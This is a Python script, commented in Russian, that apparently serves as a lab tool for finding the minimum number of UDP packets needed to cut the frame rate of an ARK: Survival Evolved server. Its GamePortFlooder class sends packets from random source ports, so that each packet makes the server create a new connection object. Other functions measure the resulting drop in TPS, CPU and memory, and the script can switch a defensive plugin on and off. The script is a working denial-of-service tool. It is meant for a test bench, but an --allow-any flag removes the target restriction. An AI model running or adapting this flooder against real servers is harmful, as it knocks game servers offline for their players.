# -*- coding: utf-8 -*-
"""
ark_lab_fpsdrop.py — поиск минимального числа пакетов, роняющих FPS сервера ARK SE.

Идея вектора (подтверждена исходниками UE4.5, IpNetDriver.cpp:255-277):

    if (!Connection)                       // источник неизвестен серверу
    {
        if (Notify->NotifyAcceptingConnection() == Accept)
        {
            Connection = ConstructObject<UIpConnection>(NetConnectionClass);
            Connection->InitRemoteConnection(...);
            AddClientConnection(Connection);
        }
    }
    if (Connection) Connection->ReceivedRawPacket(Data, BytesRead);

То есть ОДИН UDP-пакет с нового адреса (нового порта источника) порождает
на сервере новый объект UNetConnection и полный разбор пакета. Соединение
живёт до InitialConnectTimeout/ConnectionTimeout (на стенде - 300 с), поэтому
соединения копятся.

Скрипт:
  * шлёт пакеты на игровой порт (7778) с РАЗНЫМИ портами источника;
  * параллельно опрашивает метрики плагина NetGuard (TPS, tickMs, живые
    соединения, попытки соединения);
  * печатает, сколько пакетов понадобилось для просадки FPS.

Ограничения: только 127.0.0.1 / 192.168.8.218 (стенд), никакого спуфинга,
никаких внешних целей, ограничение по объёму и времени.

Примеры:
  python ark_lab_fpsdrop.py --game-port 7778 --count 2000 --pps 500
  python ark_lab_fpsdrop.py --game-port 7778 --sweep 200,1000,5000,20000
  python ark_lab_fpsdrop.py --game-port 7778 --sweep 200,1000,5000 --defense on
"""

from __future__ import annotations

import argparse
import os
import random
import socket
import statistics
import sys
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ark_lab_metrics import NetGuardClient, MetricsError  # noqa: E402
from ark_lab_net import guard_target, LabTargetError, pick_pid, ProcessMeter  # noqa: E402

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):
        pass


# ---------------------------------------------------------------------------
# Отправитель
# ---------------------------------------------------------------------------

class GamePortFlooder:
    """Шлёт UDP-пакеты на игровой порт, каждый с нового порта источника.

    Новый порт источника = новый адрес для сервера = новое соединение.
    Именно это и есть «множитель» атаки: один пакет - один UNetConnection.
    """

    def __init__(self, host: str, port: int, payload_size: int = 64,
                 random_payload: bool = True, mode: str = "game",
                 wait_reply: bool = False):
        self.host = host
        self.port = port
        self.payload_size = payload_size
        self.random_payload = random_payload
        self.mode = mode
        self.wait_reply = wait_reply
        self.sent = 0
        self.errors = 0
        self.replies = 0
        self._lock = threading.Lock()

    def _payload(self) -> bytes:
        if self.mode == "query":
            # A2S_GETCHALLENGE: 'T' + "Source Engine Query\0"
            return b"\xff\xff\xff\xff\x54Source Engine Query\x00"
        if self.random_payload:
            return os.urandom(self.payload_size)
        return b"\x00" * self.payload_size

    def send_one(self) -> bool:
        """Один пакет с нового эфемерного порта источника."""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            if self.mode == "game":
                # Явно привязываемся к случайному порту источника: сервер видит
                # новый адрес и создаёт под него соединение.
                src = random.randint(20000, 60000)
                try:
                    s.bind(("0.0.0.0", src))
                except OSError:
                    pass  # порт занят - пусть система выберет другой
            s.sendto(self._payload(), (self.host, self.port))
            with self._lock:
                self.sent += 1
            if self.mode == "query" and self.wait_reply:
                try:
                    s.settimeout(0.2)
                    s.recv(4096)
                    with self._lock:
                        self.replies += 1
                except (socket.timeout, OSError):
                    pass
            return True
        except OSError:
            with self._lock:
                self.errors += 1
            return False
        finally:
            s.close()

    def burst(self, count: int, pps: int, stop: threading.Event | None = None) -> None:
        """Шлёт count пакетов с темпом pps (0 - без ограничения темпа)."""
        interval = (1.0 / pps) if pps > 0 else 0.0
        threads = []
        workers = max(1, min(8, (pps // 200) or 1))
        per_worker = count // workers
        remainder = count % workers

        def runner(n: int) -> None:
            for _ in range(n):
                if stop is not None and stop.is_set():
                    return
                self.send_one()
                if interval:
                    time.sleep(interval / workers)

        for i in range(workers):
            n = per_worker + (1 if i < remainder else 0)
            t = threading.Thread(target=runner, args=(n,), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()


# ---------------------------------------------------------------------------
# Метрики
# ---------------------------------------------------------------------------

class MetricsWatcher:
    """Фоновое чтение метрик NetGuard (TPS/тик/соединения)."""

    def __init__(self, host: str, port: int, enabled: bool = True):
        self.enabled = enabled
        self.host = host
        self.port = port
        self.samples: list[dict] = []
        self._stop = threading.Event()
        self._client = None
        self._thread = None

    def start(self) -> None:
        if not self.enabled:
            return
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def _run(self) -> None:
        try:
            self._client = NetGuardClient(self.host, self.port, timeout=3.0).connect()
        except OSError:
            return
        while not self._stop.is_set():
            try:
                s = self._client.status()
                s["t"] = time.time()
                self.samples.append(s)
            except (OSError, MetricsError):
                pass
            time.sleep(0.5)

    def stop(self) -> None:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=2.0)
        if self._client:
            self._client.close()

    def last(self) -> dict | None:
        return self.samples[-1] if self.samples else None

    def window(self, seconds: float) -> list[dict]:
        if not self.samples:
            return []
        t_end = self.samples[-1]["t"]
        return [s for s in self.samples if s["t"] >= t_end - seconds]


def tps_series(samples: list[dict]) -> list[float]:
    return [float(s.get("tps", 0.0)) for s in samples]


# ---------------------------------------------------------------------------
# Эксперимент
# ---------------------------------------------------------------------------

def measure_baseline(watcher: MetricsWatcher, seconds: float = 6.0) -> dict:
    """Снимает спокойный фон (TPS до атаки)."""
    watcher.samples.clear()
    time.sleep(seconds)
    s = watcher.last()
    if not s:
        return {}
    series = tps_series(watcher.samples)
    return {
        "tps_med": statistics.median(series) if series else 0.0,
        "tps_min": min(series) if series else 0.0,
        "tickMs": s.get("tickMs", 0.0),
        "tickMsMax": s.get("tickMsMax", 0.0),
        "live": s.get("liveConnections", 0),
        "memKB": s.get("memKB", 0),
    }


def run_burst(args, watcher: MetricsWatcher, count: int, meter=None) -> dict:
    """Одна серия пакетов + измерение последствий."""
    print("\n" + "-" * 78)
    print("СЕРИЯ: %d пакетов на %s:%d (темп %s)"
          % (count, args.host, args.game_port, ("%d pps" % args.pps) if args.pps else "max"))
    base = measure_baseline(watcher, seconds=args.baseline_seconds)
    if base:
        print("  фон: tps=%.1f (min %.1f)  tick=%.2f ms  живых соединений=%d  mem=%d MB"
              % (base["tps_med"], base["tps_min"], base["tickMs"], base["live"], base["memKB"] // 1024))

    cpu0 = meter.sample() if meter else None
    flooder = GamePortFlooder(args.host, args.game_port, args.payload_size,
                              mode=args.mode, wait_reply=args.wait_reply)
    before = watcher.last() or {}
    attempts0 = int(before.get("connectionAttempts", 0))
    t0 = time.time()
    flooder.burst(count, args.pps)
    elapsed = time.time() - t0
    print("  отправлено %d пакетов за %.2f с (%.0f pps), ошибок %d"
          % (flooder.sent, elapsed, flooder.sent / max(0.001, elapsed), flooder.errors))

    # ждём, пока сервер "просядет" и вернётся
    time.sleep(args.observe_seconds)
    after = watcher.last() or {}
    attempts1 = int(after.get("connectionAttempts", 0))
    win = watcher.window(seconds=args.observe_seconds)
    series = [t for t in tps_series(win) if t > 0.0]

    cpu_pct = 0.0
    if meter:
        cpu1 = meter.sample()
        dt = cpu1["t"] - cpu0["t"]
        if dt > 0:
            cpu_pct = max(0.0, (cpu1["cpu"] - cpu0["cpu"]) / dt * 100.0)
        print("  CPU процесса сервера за окно: %.1f%%" % cpu_pct)

    res = {
        "count": count,
        "sent": flooder.sent,
        "elapsed": elapsed,
        "pps": flooder.sent / max(0.001, elapsed),
        "cpu_pct": cpu_pct,
        "attempts_delta": attempts1 - attempts0,
        "live_after": int(after.get("liveConnections", 0)),
        "tps_base": base.get("tps_med", 0.0),
        "tps_min_after": min(series) if series else 0.0,
        "tps_after": float(after.get("tps", 0.0)),
        "tickMs_base": base.get("tickMs", 0.0),
        "tickMs_after": float(after.get("tickMs", 0.0)),
        "mem_base": base.get("memKB", 0),
        "mem_after": int(after.get("memKB", 0)),
        "rejected": int(after.get("connectionsRejected", 0)),
        "packetsReceived": int(after.get("packetsReceived", 0)),
    }
    print("  сервер: попыток соединения +%d, живых соединений %d, отклонено защитой %d"
          % (res["attempts_delta"], res["live_after"], res["rejected"]))
    print("  tps: %.1f -> %.1f (минимум за окно %.1f)   tick: %.2f -> %.2f ms   mem: %d -> %d MB"
          % (res["tps_base"], res["tps_after"], res["tps_min_after"],
             res["tickMs_base"], res["tickMs_after"],
             res["mem_base"] // 1024, res["mem_after"] // 1024))
    drop = res["tps_base"] - res["tps_min_after"]
    if base.get("tps_med"):
        print("  просадка FPS: %.1f (%.1f%% от фона)"
              % (drop, 100.0 * drop / max(1e-6, base["tps_med"])))
    return res


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Поиск минимального числа пакетов для просадки FPS")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--mode", choices=["game", "query"], default="game",
                    help="game - игровой порт (мусорные пакеты); query - Steam-query порт")
    ap.add_argument("--wait-reply", action="store_true",
                    help="ждать ответ на каждый пакет (для query даёт частоту ответов)")
    ap.add_argument("--metrics-host", default="127.0.0.1")
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--count", type=int, default=2000, help="пакетов в одной серии")
    ap.add_argument("--pps", type=int, default=0, help="темп (0 - максимум)")
    ap.add_argument("--payload-size", type=int, default=64)
    ap.add_argument("--sweep", type=str, default="",
                    help="список размеров серий через запятую, например 200,1000,5000")
    ap.add_argument("--baseline-seconds", type=float, default=6.0)
    ap.add_argument("--observe-seconds", type=float, default=15.0)
    ap.add_argument("--cooldown-seconds", type=float, default=30.0)
    ap.add_argument("--defense", choices=["on", "off"], default="off",
                    help="включить/выключить защиту NetGuard на время опыта")
    ap.add_argument("--allow-any", action="store_true")
    ap.add_argument("--server-filter", default="Server2",
                    help="подстрока пути к exe сервера, для которого снимаются метрики CPU")
    args = ap.parse_args(argv)

    try:
        guard_target(args.host, args.allow_any)
    except LabTargetError as exc:
        print("[!] %s" % (exc,))
        return 2

    pid = pick_pid("ShooterGameServer.exe", args.server_filter)
    meter = ProcessMeter(pid)
    if pid:
        print("  процесс сервера: PID %d (метрики CPU снимаются с него)" % pid)

    print("=" * 78)
    print("ARK SE — поиск минимального числа пакетов для просадки FPS")
    print("=" * 78)
    print("  цель          : %s:%d" % (args.host, args.game_port))
    print("  метрики       : %s:%d (плагин NetGuard)" % (args.metrics_host, args.metrics_port))
    print("  защита        : %s" % args.defense)

    watcher = MetricsWatcher(args.metrics_host, args.metrics_port)
    watcher.start()
    time.sleep(1.0)

    client = None
    if args.defense != "off":
        try:
            client = NetGuardClient(args.metrics_host, args.metrics_port).connect()
            print("  защита -> %s" % client.set_defense(args.defense == "on"))
        except (OSError, MetricsError) as exc:
            print("  [!] не удалось переключить защиту: %r" % (exc,))

    counts = [int(x) for x in args.sweep.split(",") if x.strip()] if args.sweep else [args.count]

    results = []
    try:
        for n in counts:
            res = run_burst(args, watcher, n, meter)
            results.append(res)
            if n != counts[-1]:
                print("  ... пауза %d с (сервер должен восстановиться)" % args.cooldown_seconds)
                time.sleep(args.cooldown_seconds)
    except KeyboardInterrupt:
        print("\n[!] прервано")
    finally:
        watcher.stop()
        if client:
            client.close()

    print("\n" + "=" * 78)
    print("ИТОГ")
    print("=" * 78)
    print("%10s %10s %12s %10s %10s %12s" % ("пакетов", "попыток", "живых кон.", "tps фон", "tps min", "просадка"))
    for r in results:
        print("%10d %10d %12d %10.1f %10.1f %12.1f"
              % (r["sent"], r["attempts_delta"], r["live_after"],
                 r["tps_base"], r["tps_min_after"],
                 r["tps_base"] - r["tps_min_after"]))
    return 0


if __name__ == "__main__":
    sys.exit(main())
